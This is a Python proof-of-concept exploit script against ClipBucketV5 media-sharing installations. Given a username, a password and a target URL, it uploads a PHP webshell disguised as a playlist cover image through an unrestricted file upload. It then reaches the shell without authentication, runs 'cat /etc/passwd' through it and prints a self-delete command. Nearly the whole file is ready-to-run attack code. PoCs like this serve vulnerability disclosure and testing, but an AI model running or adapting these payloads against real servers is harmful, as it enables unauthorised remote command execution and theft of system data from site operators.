#!/usr/bin/python

# by Ka Wing Ho - wingz
# assumes Linux system not Windows
# python poc.py <username> <password> <http(s)://target>

from datetime import datetime
import requests
import sys

# get args
USAGE = "Usage: python {} <username> <password> <http(s)://target>".format(sys.argv[0])
if len(sys.argv) < 4:
    print(USAGE)
    sys.exit()

user = sys.argv[1]
passw = sys.argv[2]
target = sys.argv[3]

if 'http' not in target:
    print(USAGE)
    print("[>] Please specify http:// or https:// protocol")
    sys.exit()

# remove trailing slash if present
if target[-1] == "/": target = target[:-1]

# testing connection to target
r = requests.get(target)
if "ClipBucketV5" not in r.text:
    print("[>] Target frontpage not accessible or is not ClipBucketV5")
    sys.exit()

# obtain user session
s = requests.Session()
login_data = {
        "login"   : "login",
        "username": user,
        "password": passw
}

r = s.post("{}/signup.php?mode=login".format(target),login_data)
if 'Username and Password Didn&#039;t Match' in r.text:
    print("[>] Authentication failed, bad username and/or password")
    sys.exit(1)

# check if admin or not, adjust web request
r = s.get(target)
if "Admin Area" in r.text:
    print("[+] Admin session, using Admin URL")
    upload_url = "/admin_area/manage_playlist.php"
    isAdmin = True
else:
    print("[+] Low-level session, using regular user URL")
    upload_url = "/manage_playlists.php"
    isAdmin = False

# upload webshell
dt = datetime.today().strftime('%Y/%m/%d')
webshell_code = '''<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>'''

payload = {
    "upload_playlist_cover": (None,"1"),
    "playlist_cover" : ("shell.php", webshell_code)
} # we don't need any of the other parameters, just the essentials

r = s.post("{}{}?mode=edit_playlist&pid=1337".format(target,upload_url), files=payload)
if isAdmin and r.status_code == 200 and "Playlist does not exist" in r.text:
    print("[+] Webshell upload as admin succeeded")
elif not isAdmin and r.status_code == 200 and "Playlist cover has been uploaded" in r.text:
    print("[+] Webshell upload as low-level user succeeded")
else:
    print("[-] Webshell upload failed!!!")
    sys.exit(1)

# verify webshell (with unauth-ed session)
webshell_url = "{}/images/playlist_covers/{}/1337.php".format(target,dt)
r = requests.get(webshell_url)
if r.status_code == 404:
    # you may have to try +- 1 day to account for different server clocktimes
    print("[>] Webshell browsing failed! Maybe incorrect date in URL path: {}".format(dt))
    print("[>] Try increasing/decreasing the date: {}".format(webshell_url))
    sys.ext(1)
elif r.status_code == 200:
    pass
else:
    print("[>] Unknown error: {}".format(r.status_code))
    sys.exit(2)

# execute webshell sample (with unauth-ed session)
cmd = "cat+/etc/passwd"
rce_url = "{}/images/playlist_covers/{}/1337.php?cmd={}".format(target,dt,cmd)
print("[+] Sample webshell usage: \033[94m{}\x1b[0m (you can copy+paste this in browser)".format(rce_url))
r = requests.get(rce_url)

print(r.text.replace("<pre>","\n").replace("</pre>",""))

cmd = "rm+1337.php"
delete_url = "{}/images/playlist_covers/{}/1337.php?cmd={}".format(target,dt,cmd)
print("[+] Cleanup: use the webshell to delete itself => \033[93m{}\x1b[0m (you can copy+paste this in browser)".format(delete_url))
